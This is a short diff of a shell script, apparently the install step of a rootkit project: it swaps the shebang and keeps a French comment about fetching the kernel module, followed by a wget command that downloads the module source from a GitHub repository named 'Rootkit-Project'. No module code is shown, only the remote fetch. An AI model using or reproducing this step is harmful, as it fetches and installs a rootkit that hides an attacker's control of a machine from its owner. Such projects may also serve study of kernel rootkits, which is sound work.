@@ -1,4 +1,4 @@
-#!/bin/ash
+#!/usr/bin/env sh
 
 # récuperer le .ko
 wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/main/mesmodules/unleashed/ipv5.c
